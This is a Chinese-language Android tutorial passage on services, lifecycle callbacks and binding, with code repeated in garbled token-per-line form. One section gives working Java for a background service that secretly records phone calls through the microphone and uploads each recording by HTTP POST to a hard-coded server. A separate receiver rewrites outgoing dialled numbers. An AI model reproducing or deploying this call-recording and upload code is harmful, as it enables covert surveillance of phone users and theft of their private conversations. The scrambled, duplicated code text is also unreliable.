   public void click(View view){     	 EditText et =  (EditText) this.findViewById(R.id.et_ipnumber);     	 String ipnumber = et.getText().toString().trim();     	 SharedPreferences sp = getSharedPreferences("config", Context.MODE_PRIVATE);     	 Editor editor = sp.edit();     	 editor.putString("ipnumber", ipnumber);     	 editor.commit();      }  public class OutGoingCallReceiver extends BroadcastReceiver {  @Override public void onReceive(Context context, Intent intent) { System.out.println(getResultData()); //abortBroadcast(); SharedPreferences sp = context.getSharedPreferences("config", Context.MODE_PRIVATE); String ipnumber = sp.getString("ipnumber", "");     setResultData(ipnumber+getResultData()); }  }

23
 
1
   
public
 
void
 
click
(
View
 
view
){
2
    
    
 
EditText
 
et
 
=
  (
EditText
) 
this
.
findViewById
(
R
.
id
.
et_ipnumber
);
3
    
    
 
String
 
ipnumber
 
=
 
et
.
getText
().
toString
().
trim
();
4
    
    
 
SharedPreferences
 
sp
 
=
 
getSharedPreferences
(
"config"
, 
Context
.
MODE_PRIVATE
);
5
    
    
 
Editor
 
editor
 
=
 
sp
.
edit
();
6
    
    
 
editor
.
putString
(
"ipnumber"
, 
ipnumber
);
7
    
    
 
editor
.
commit
();
8
     }
9
10
public
 
class
 
OutGoingCallReceiver
 
extends
 
BroadcastReceiver
 {
11
12
    
@Override
13
    
public
 
void
 
onReceive
(
Context
 
context
, 
Intent
 
intent
) {
14
    
    
System
.
out
.
println
(
getResultData
());
15
    
    
//abortBroadcast();
16
    
    
 
SharedPreferences
 
sp
 
=
 
context
.
getSharedPreferences
(
"config"
, 
Context
.
MODE_PRIVATE
);
17
    
    
 
String
 
ipnumber
 
=
 
sp
.
getString
(
"ipnumber"
, 
""
);
18
    
    
 
19
    
    
 
20
    
    
 
setResultData
(
ipnumber
+
getResultData
());
21
    
}
22
23
}


=========================服务service==============



Android中的服务和windows中的服务是类似的东西，服务一般没有用户操作界面，它运行于系统中不容易被用户发觉，可以使用它开发如监控之类的程序。服务的开发比较简单，如下：

第一步：继承Service类

public class SMSService extends Service { }

第二步：在AndroidManifest.xml文件中的<application>节点里对服务进行配置:

< service android:name=".SMSService" />

服务不能自己运行，需要通过调用Context.startService()或Context.bindService()方法启动服务。这两个方法都可以启动Service，但是它们的使用场合有所不同。使用 startService ()方法启用服务，访问者与服务之间没有关连，即使访问者退出了，服务仍然运行。使用 bindService ()方法启用服务，访问者与服务绑定在了一起，访问者一旦退出，服务也就终止，大有“不求同时生，必须同时死”的特点。

采用Context.startService()方法启动服务，只能调用Context. stopService ()方法结束服务，服务结束时会调用 onDestroy ()方法。

------------------------



通过startService()和stopService()启动关闭服务。适用于服务和访问者之间 没有交互 的情况。如果服务和访问者之间需要方法调用或者传递参数，侧需要使用bindService()和unbindService()方法启动关闭服务。




采用Context.bindService()方法启动服务，在服务未被创建时，系统会先调用服务的onCreate()方法，接着调用onBind()方法，这个时候访问者和服务绑定在一起。 如果访问者要与服务进行通信，那么，onBind()方法必须返回 Ibinder 对象。如果访问者退出了，系统就会先调用服务的onUnbind()方法，接着调用onDestroy()方法。如果调用bindService()方法前服务已经被绑定，多次调用bindService()方法并不会导致多次创建服务及绑定(也就是说onCreate()和onBind()方法并不会被多次调用)。如果访问者希望与正在绑定的服务解除绑定，可以调用unbindService()方法，调用该方法也会导致系统调用服务的onUnbind()-->onDestroy()方法。

=============服务的生命周期回调方法====================



服务的生命周期跟启动服务的方法有关：

 当采用Context.startService()方法启动服务，与之有关的生命周期方法

onCreate() onStart()  onDestroy()

onCreate()该方法在服务被创建时调用，该方法只会被调用一次，无论调用多少次startService()或bindService()方法，服务也只被创建一次。

onStart() 只有采用Context.startService()方法启动服务时才会回调该方法。该方法在服务开始运行时被调用。多次调用startService()方法尽管不会多次创建服务，但onStart() 方法会被多次调用。

onDestroy()该方法在服务被终止时调用。

 当采用Context.bindService()方法启动服务，与之有关的生命周期方法

onCreate() onBind()  onUnbind()  onDestroy()

onBind()只有采用Context.bindService()方法启动服务时才会回调该方法。该方法在调用者与服务绑定时被调用，当调用者与服务已经绑定，多次调用Context.bindService()方法并不会导致该方法被多次调用。

onUnbind()只有采用Context.bindService()方法启动服务时才会回调该方法。该方法在调用者与服务解除绑定时被调用。

如果先采用startService()方法启动服务,然后调用bindService()方法绑定到服务，再调用unbindService()方法解除绑定，最后调用bindService()方法再次绑定到服务，触发的生命周期方法如下：

onCreate()onStart()onBind()onUnbind()[重载后的方法需返回true]onRebind()






=====================电话录音,并上传到服务器==========================


public class PhoneListenService extends Service {
    // activity receiver contentprovider
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    /**
     * 在服务第一次被创建的时候 执行
     */
     * 在服务第一次被创建的时候 执行
     */
    @Override
    public void onCreate() {
        super.onCreate();
        setForeground(true);
        
        // 1. 判断当前手机的状态,
        // 如果发现手机处于 通话状态
        // 创建一个录音器, 录下来用户的通话信息
        // 当发现手机再次处于 idle 状态 停止录音机,把音频文件 上传到服务器
        // 得到手机与电话状态相关的服务
        TelephonyManager manager = (TelephonyManager) this
                .getSystemService(TELEPHONY_SERVICE);
        // this.getSystemService(WIFI_SERVICE);
        manager.listen(new MyPhoneListener(),
                PhoneStateListener.LISTEN_CALL_STATE);
          
        System.out.println(" 线程id "+ Thread.currentThread().getName());
    }
    private class MyPhoneListener extends PhoneStateListener {
        MediaRecorder recorder = null;
        /**
         * 当电话的通话状态发生改变的时候 被调用的方法
         */
         * 当电话的通话状态发生改变的时候 被调用的方法
         */
        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            try {
                switch (state) {
                case TelephonyManager.CALL_STATE_IDLE: // 当前电话处于闲置状态
                    System.out.println("当前电话处于闲置状态 ");
                    
                    // 判断下recorder是否为空 
                    if(recorder!=null){
                        recorder.stop();
                        recorder.release(); // Now the object cannot be reused
                        recorder = null;
                        
                        new Thread(){
                            @Override
                            public void run() {
                                // 上传数据到服务器  演示的代码  有问题的 
                                File file = new File("/sdcard/temp.3gp");
                                try {
                                    upload(file);
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            }
                        }.start();
                    }
                    break;
                case TelephonyManager.CALL_STATE_RINGING: // 当前电话处于零响状态
                    System.out.println("电话号码为 " + incomingNumber);
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK: // 当前电话处于接听状态
                    System.out.println("当前电话处于通话状态 ");
                    // 初始化一个录音器,
                    recorder = new MediaRecorder();
                    recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                    recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                    //recorder.setOutputFile("sdcard/temp.3gp");
//                    File file = new File("/sdcard/temp.3gp");
//                    FileOutputStream fos = new FileOutputStream(file);
//                    fos.write("haha".getBytes());
                    recorder.setOutputFile("/sdcard/temp.3gp");
                    recorder.prepare();
                    recorder.start(); // Recording is now started
                
                    break;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            super.onCallStateChanged(state, incomingNumber);
        }
    }
    
    
    public void upload(File file) throws Exception{
        // 实例化上传数据的 数组  part []
        Part[] parts = {
                  new FilePart("file",file)};
        
        PostMethod filePost = new PostMethod("http://192.168.1.247:8080/web/LoginServlet");
        
      
        filePost.setRequestEntity(new MultipartRequestEntity(parts, filePost.getParams()));
        org.apache.commons.httpclient.HttpClient client = new org.apache.commons.httpclient.HttpClient();
        client.getHttpConnectionManager().getParams()
          .setConnectionTimeout(5000);
        int status = client.executeMethod(filePost);
        if(status==200){
            
            System.out.println("上传成功");
        }
        else{
            throw new IllegalStateException("服务器状态异常");
        }
 
    }
    
}
public class DemoActivity extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        Intent intent = new Intent(this,PhoneListenService.class);
        startService(intent);
        
    }
}


126

 

1
public
 
class
 
PhoneListenService
 
extends
 
Service
 {
2
    
// activity receiver contentprovider
3
    
@Override
4
    
public
 
IBinder
 
onBind
(
Intent
 
intent
) {
5
        
return
 
null
;
6
    }
7
    
/**
8
     
* 在服务第一次被创建的时候 执行
9
     
*/
10
     
*
 
在服务第一次被创建的时候
 
执行
11
     
*/
12
    
@Override
13
    
public
 
void
 
onCreate
() {
14
        
super
.
onCreate
();
15
        
setForeground
(
true
);
16
        
17
        
// 1. 判断当前手机的状态,
18
        
// 如果发现手机处于 通话状态
19
        
// 创建一个录音器, 录下来用户的通话信息
20
        
// 当发现手机再次处于 idle 状态 停止录音机,把音频文件 上传到服务器
21
        
// 得到手机与电话状态相关的服务
22
        
TelephonyManager
 
manager
 
=
 (
TelephonyManager
) 
this
23
                .
getSystemService
(
TELEPHONY_SERVICE
);
24
        
// this.getSystemService(WIFI_SERVICE);
25
        
manager
.
listen
(
new
 
MyPhoneListener
(),
26
                
PhoneStateListener
.
LISTEN_CALL_STATE
);
27
          
28
        
System
.
out
.
println
(
" 线程id "
+
 
Thread
.
currentThread
().
getName
());
29
    }
30
    
private
 
class
 
MyPhoneListener
 
extends
 
PhoneStateListener
 {
31
        
MediaRecorder
 
recorder
 
=
 
null
;
32
        
/**
33
         
* 当电话的通话状态发生改变的时候 被调用的方法
34
         
*/
35
         
*
 
当电话的通话状态发生改变的时候
 
被调用的方法
36
         
*/
37
        
@Override
38
        
public
 
void
 
onCallStateChanged
(
int
 
state
, 
String
 
incomingNumber
) {
39
            
try
 {
40
                
switch
 (
state
) {
41
                
case
 
TelephonyManager
.
CALL_STATE_IDLE
: 
// 当前电话处于闲置状态
42
                    
System
.
out
.
println
(
"当前电话处于闲置状态 "
);
43
                    
44
                    
// 判断下recorder是否为空 
45
                    
if
(
recorder
!=
null
){
46
                        
recorder
.
stop
();
47
                        
recorder
.
release
(); 
// Now the object cannot be reused
48
                        
recorder
 
=
 
null
;
49
                        
50
                        
new
 
Thread
(){
51
                            
@Override
52
                            
public
 
void
 
run
() {
53
                                
// 上传数据到服务器  演示的代码  有问题的 
54
                                
File
 
file
 
=
 
new
 
File
(
"/sdcard/temp.3gp"
);
55
                                
try
 {
56
                                    
upload
(
file
);
57
                                } 
catch
 (
Exception
 
e
) {
58
                                    
e
.
printStackTrace
();
59
                                }
60
                            }
61
                        }.
start
();
62
                    }
63
                    
break
;
64
                
case
 
TelephonyManager
.
CALL_STATE_RINGING
: 
// 当前电话处于零响状态
65
                    
System
.
out
.
println
(
"电话号码为 "
 
+
 
incomingNumber
);
66
                    
break
;
67
                
case
 
TelephonyManager
.
CALL_STATE_OFFHOOK
: 
// 当前电话处于接听状态
68
                    
System
.
out
.
println
(
"当前电话处于通话状态 "
);
69
                    
// 初始化一个录音器,
70
                    
recorder
 
=
 
new
 
MediaRecorder
();
71
                    
recorder
.
setAudioSource
(
MediaRecorder
.
AudioSource
.
MIC
);
72
                    
recorder
.
setOutputFormat
(
MediaRecorder
.
OutputFormat
.
THREE_GPP
);
73
                    
recorder
.
setAudioEncoder
(
MediaRecorder
.
AudioEncoder
.
AMR_NB
);
74
                    
//recorder.setOutputFile("sdcard/temp.3gp");
75
//                    File file = new File("/sdcard/temp.3gp");
76
//                    FileOutputStream fos = new FileOutputStream(file);
77
//                    fos.write("haha".getBytes());
78
                    
recorder
.
setOutputFile
(
"/sdcard/temp.3gp"
);
79
                    
recorder
.
prepare
();
80
                    
recorder
.
start
(); 
// Recording is now started
81
                
82
                    
break
;
83
                }
84
            } 
catch
 (
Exception
 
e
) {
85
                
e
.
printStackTrace
();
86
            }
87
            
super
.
onCallStateChanged
(
state
, 
incomingNumber
);
88
        }
89
    }
90
    
91
    
92
    
public
 
void
 
upload
(
File
 
file
) 
throws
 
Exception
{
93
        
// 实例化上传数据的 数组  part []
94
        
Part
[] 
parts
 
=
 {
95
                  
new
 
FilePart
(
"file"
,
file
)};
96
        
97
        
PostMethod
 
filePost
 
=
 
new
 
PostMethod
(
"http://192.168.1.247:8080/web/LoginServlet"
);
98
        
99
      
100
        
filePost
.
setRequestEntity
(
new
 
MultipartRequestEntity
(
parts
, 
filePost
.
getParams
()));
101
        
org
.
apache
.
commons
.
httpclient
.
HttpClient
 
client
 
=
 
new
 
org
.
apache
.
commons
.
httpclient
.
HttpClient
();
102
        
client
.
getHttpConnectionManager
().
getParams
()
103
          .
setConnectionTimeout
(
5000
);
104
        
int
 
status
 
=
 
client
.
executeMethod
(
filePost
);
105
        
if
(
status
==
200
){
106
            
107
            
System
.
out
.
println
(
"上传成功"
);
108
        }
109
        
else
{
110
            
throw
 
new
 
IllegalStateException
(
"服务器状态异常"
);
111
        }
112
 
113
    }
114
    
115
}
116
public
 
class
 
DemoActivity
 
extends
 
Activity
 {
117
    
/** Called when the activity is first created. */
118
    
@Override
119
    
public
 
void
 
onCreate
(
Bundle
 
savedInstanceState
) {
120
        
super
.
onCreate
(
savedInstanceState
);
121
        
setContentView
(
R
.
layout
.
main
);
122
        
Intent
 
intent
 
=
 
new
 
Intent
(
this
,
PhoneListenService
.
class
);
123
        
startService
(
intent
);
124
        
125
    }
126
}


public class DemoActivity extends Activity implements OnClickListener {  Button bt_start; Button bt_stop; Button bt_bind_service; //绑定服务 Button bt_unbind_service; //解除绑定服务 Button bt_call_service; Intent intent ; MyConn conn; IService iService;     @Override     public void onCreate(Bundle savedInstanceState) {         super.onCreate(savedInstanceState);         setContentView(R.layout.main);         bt_start = (Button) this.findViewById(R.id.button1);         bt_stop = (Button) this.findViewById(R.id.button2);         bt_bind_service = (Button) this.findViewById(R.id.button3);         bt_unbind_service = (Button) this.findViewById(R.id.button4);         bt_call_service = (Button)this.findViewById(R.id.button5);         bt_start.setOnClickListener(this);         bt_stop.setOnClickListener(this);         bt_bind_service.setOnClickListener(this);         bt_unbind_service.setOnClickListener(this);         bt_call_service.setOnClickListener(this);         intent = new Intent(this,MyService.class);         conn = new MyConn();              } @Override public void onClick(View v) { switch (v.getId()) { case R.id.button1: // 开启服务 startService(intent); break; case R.id.button2: //停止服务 stopService(intent); break; case R.id.button3: // 绑定服务 bindService(intent, conn, Context.BIND_AUTO_CREATE); break; case R.id.button4: //解除绑定服务 unbindService(conn); break; // 绑定开启 case R.id.button5: //调用服务里面的方法  iService.callMethodInService(); break; } }  private class MyConn implements ServiceConnection{  //绑定一个服务成功的时候 调用 onServiceConnected @Override public void onServiceConnected(ComponentName name, IBinder service) { iService = (IService) service; } @Override public void onServiceDisconnected(ComponentName name) {  } }  @Override protected void onDestroy() { unbindService(conn); super.onDestroy(); }  }   public class MyService extends Service {  @Override public IBinder onBind(Intent intent) {  System.out.println("on bind"); return new MyBinder(); }   public class MyBinder extends Binder implements IService{  @Override public void callMethodInService() {  sayHelloInService(); }  }    /** * 服务里面的一个方法  */ public void sayHelloInService(){ System.out.println("hello in service"); }  @Override public boolean onUnbind(Intent intent) { System.out.println("on  unbind"); return super.onUnbind(intent); }  @Override public void onCreate() { System.out.println("oncreate"); super.onCreate(); }  @Override public void onStart(Intent intent, int startId) { System.out.println("onstart");  super.onStart(intent, startId); }  @Override public void onDestroy() { System.out.println("ondestroy"); super.onDestroy(); } }  public interface IService { public void callMethodInService(); }

130
 
1
public
 
class
 
DemoActivity
 
extends
 
Activity
 
implements
 
OnClickListener
 {
2
3
    
Button
 
bt_start
;
4
    
Button
 
bt_stop
;
5
    
Button
 
bt_bind_service
; 
//绑定服务
6
    
Button
 
bt_unbind_service
; 
//解除绑定服务
7
    
Button
 
bt_call_service
;
8
    
Intent
 
intent
 ;
9
    
MyConn
 
conn
;
10
    
IService
 
iService
;
11
    
@Override
12
    
public
 
void
 
onCreate
(
Bundle
 
savedInstanceState
) {
13
        
super
.
onCreate
(
savedInstanceState
);
14
        
setContentView
(
R
.
layout
.
main
);
15
        
bt_start
 
=
 (
Button
) 
this
.
findViewById
(
R
.
id
.
button1
);
16
        
bt_stop
 
=
 (
Button
) 
this
.
findViewById
(
R
.
id
.
button2
);
17
        
bt_bind_service
 
=
 (
Button
) 
this
.
findViewById
(
R
.
id
.
button3
);
18
        
bt_unbind_service
 
=
 (
Button
) 
this
.
findViewById
(
R
.
id
.
button4
);
19
        
bt_call_service
 
=
 (
Button
)
this
.
findViewById
(
R
.
id
.
button5
);
20
        
bt_start
.
setOnClickListener
(
this
);
21
        
bt_stop
.
setOnClickListener
(
this
);
22
        
bt_bind_service
.
setOnClickListener
(
this
);
23
        
bt_unbind_service
.
setOnClickListener
(
this
);
24
        
bt_call_service
.
setOnClickListener
(
this
);
25
        
intent
 
=
 
new
 
Intent
(
this
,
MyService
.
class
);
26
        
conn
 
=
 
new
 
MyConn
();
27
        
28
    }
29
    
@Override
30
    
public
 
void
 
onClick
(
View
 
v
) {
31
    
    
switch
 (
v
.
getId
()) {
32
    
    
case
 
R
.
id
.
button1
: 
// 开启服务
33
    
    
    
startService
(
intent
);
   
    
    
34
    
    
    
break
;
35
    
    
case
 
R
.
id
.
button2
: 
//停止服务
36
    
    
    
stopService
(
intent
);
37
    
    
    
break
;
38
    
    
case
 
R
.
id
.
button3
: 
// 绑定服务
39
    
    
    
bindService
(
intent
, 
conn
, 
Context
.
BIND_AUTO_CREATE
);
40
    
    
    
break
;
41
    
    
case
 
R
.
id
.
button4
: 
//解除绑定服务
42
    
    
    
unbindService
(
conn
);
43
    
    
    
break
;
  
44
    
    
    
// 绑定开启
45
    
    
case
 
R
.
id
.
button5
: 
//调用服务里面的方法 
46
    
    
    
iService
.
callMethodInService
();
47
    
    
    
break
;
  
48
    
    
}
49
    
}
50
    
51
    
private
 
class
 
MyConn
 
implements
 
ServiceConnection
{
52
53
    
    
//绑定一个服务成功的时候 调用 onServiceConnected
54
    
    
@Override
55
    
    
public
 
void
 
onServiceConnected
(
ComponentName
 
name
, 
IBinder
 
service
) {
56
    
    
    
iService
 
=
 (
IService
) 
service
;
57
    
    
}
58
    
    
@Override
59
    
    
public
 
void
 
onServiceDisconnected
(
ComponentName
 
name
) {
60
    
    
    
61
    
    
}
62
    
}
63
64
    
@Override
65
    
protected
 
void
 
onDestroy
() {
66
    
    
unbindService
(
conn
);
67
    
    
super
.
onDestroy
();
68
    
}
69
    
70
}
71
72
73
public
 
class
 
MyService
 
extends
 
Service
 {
74
75
    
@Override
76
    
public
 
IBinder
 
onBind
(
Intent
 
intent
) {
77
78
    
    
System
.
out
.
println
(
"on bind"
);
79
    
    
return
 
new
 
MyBinder
();
80
    
}
81
82
    
83
    
public
 
class
 
MyBinder
 
extends
 
Binder
 
implements
 
IService
{
84
85
    
    
@Override
86
    
    
public
 
void
 
callMethodInService
() {
87
    
    
    
88
    
    
    
sayHelloInService
();
89
    
    
}
90
    
    
91
    
}
92
    
93
    
94
    
95
    
/**
96
    
 
* 服务里面的一个方法 
97
    
 
*/
98
    
public
 
void
 
sayHelloInService
(){
99
    
    
System
.
out
.
println
(
"hello in service"
);
100
    
}
101
    
102
    
@Override
103
    
public
 
boolean
 
onUnbind
(
Intent
 
intent
) {
104
    
    
System
.
out
.
println
(
"on  unbind"
);
105
    
    
return
 
super
.
onUnbind
(
intent
);
106
    
}
107
108
    
@Override
109
    
public
 
void
 
onCreate
() {
110
    
    
System
.
out
.
println
(
"oncreate"
);
111
    
    
super
.
onCreate
();
112
    
}
113
114
    
@Override
115
    
public
 
void
 
onStart
(
Intent
 
intent
, 
int
 
startId
) {
116
    
    
System
.
out
.
println
(
"onstart"
);
117
    
    
118
    
    
super
.
onStart
(
intent
, 
startId
);
119
    
}
120
121
    
@Override
122
    
public
 
void
 
onDestroy
() {
123
    
    
System
.
out
.
println
(
"ondestroy"
);
124
    
    
super
.
onDestroy
();
125
    
}
126
}
127
128
public
 
interface
 
IService
 {
129
    
public
 
void
 
callMethodInService
();
130
}
Activity与服务进行通信，开发人员通常把通信方法定义在接口里，然后让Ibinder对象实现该接口， 而Activity通过该接口引用服务onBind()方法返回的Ibinder对象，然后调用Ibinder对象里自定义的通信方法。例子如下：  本例是一个本地服务，即服务与Activity在同一个应用内部。 接口： public interface ICountService { public int getCount(); } 服务类： public class CountService extends Service { private boolean quit; private int count; private ServiceBinder serviceBinder = new ServiceBinder();  public class ServiceBinder extends Binder implements ICountService { @Override public int getCount() { return count; } } @Override public IBinder onBind(Intent intent) { return serviceBinder; } @Override public void onCreate() { super.onCreate(); new Thread(new Runnable() { @Override public void run() { while (!quit) {    try { Thread.sleep(1000);    } catch (InterruptedException e) {}    count++; } } }).start(); }  @Override public void onDestroy() { super.onDestroy(); this.quit = true; } } 客户端Activity： public class ClientActivity extends Activity { private ICountService countService;  @Override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main); this.bindService(new Intent(this, CountService.class), this.serviceConnection, BIND_AUTO_CREATE); }  @Override protected void onDestroy() { super.onDestroy(); this.unbindService(serviceConnection); }  private ServiceConnection serviceConnection = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { countService = (ICountService) service;//对于本地服务，获取的实例和服务onBind()返回的实例是同一个 int i = countService.getCount(); Log.v("CountService", "Count is " + i); } @Override public void onServiceDisconnected(ComponentName name) { countService = null; } }; }

x
 
1
Activity与服务进行通信，开发人员通常把通信方法定义在接口里，然后让Ibinder对象实现该接口，
2
而Activity通过该接口引用服务onBind
()
方法返回的Ibinder对象，然后调用Ibinder对象里自定义的通信方法。例子如下：
3
4
本例是一个本地服务，即服务与Activity在同一个应用内部。
5
接口：
6
public
 
interface
 
ICountService
 {
7
    
public
 
int
 
getCount
();
8
}
9
服务类：
10
public
 
class
 
CountService
 
extends
 
Service
 {
11
private
 
boolean
 
quit
;
12
private
 
int
 
count
;
13
private
 
ServiceBinder
 
serviceBinder
 
=
 
new
 
ServiceBinder
();
14
15
public
 
class
 
ServiceBinder
 
extends
 
Binder
 
implements
 
ICountService
 {
16
    
@Override
17
    
public
 
int
 
getCount
() {
18
    
    
return
 
count
;
19
    
}
20
}
21
@Override
22
public
 
IBinder
 
onBind
(
Intent
 
intent
) {
23
    
return
 
serviceBinder
;
24
}
25
@Override
26
public
 
void
 
onCreate
() {
27
    
super
.
onCreate
();
28
    
new
 
Thread
(
new
 
Runnable
() {
29
    
    
@Override
30
    
    
public
 
void
 
run
() {
31
    
    
    
while
 (
!
quit
) {
32
    
    
    
    
try
 {
33
    
    
    
    
Thread
.
sleep
(
1000
);
34
    
    
    
    } 
catch
 (
InterruptedException
 
e
) {}
35
    
    
    
    
count
++
;
36
    
    
    
}
37
    
    
}
38
    
}).
start
();
39
}
40
41
@Override
42
public
 
void
 
onDestroy
() {
43
    
super
.
onDestroy
();
44
    
this
.
quit
 
=
 
true
;
45
}
46
}
47
客户端Activity：
48
public
 
class
 
ClientActivity
 
extends
 
Activity
 {
49
    
private
 
ICountService
 
countService
;
50
51
    
@Override
52
    
public
 
void
 
onCreate
(
Bundle
 
savedInstanceState
) {
53
    
    
super
.
onCreate
(
savedInstanceState
);
54
    
    
setContentView
(
R
.
layout
.
main
);
55
    
    
this
.
bindService
(
new
 
Intent
(
this
, 
CountService
.
class
), 
this
.
serviceConnection
, 
BIND_AUTO_CREATE
);
56
    
}
57
58
    
@Override
59
    
protected
 
void
 
onDestroy
() {
60
    
    
super
.
onDestroy
();
61
    
    
this
.
unbindService
(
serviceConnection
);
62
    
}
   
63
    
64
    
private
 
ServiceConnection
 
serviceConnection
 
=
 
new
 
ServiceConnection
() {
65
    
    
@Override
66
    
    
public
 
void
 
onServiceConnected
(
ComponentName
 
name
, 
IBinder
 
service
) {
67
    
    
    
countService
 
=
 (
ICountService
) 
service
;
//对于本地服务，获取的实例和服务onBind()返回的实例是同一个
68
    
    
    
int
 
i
 
=
 
countService
.
getCount
();
    
    
    
69
    
    
    
Log
.
v
(
"CountService"
, 
"Count is "
 
+
 
i
);
70
    
    
}
71
    
    
@Override
72
    
    
public
 
void
 
onServiceDisconnected
(
ComponentName
 
name
) {
73
    
    
    
countService
 
=
 
null
;
74
    
    
}
75
    
};
76
}











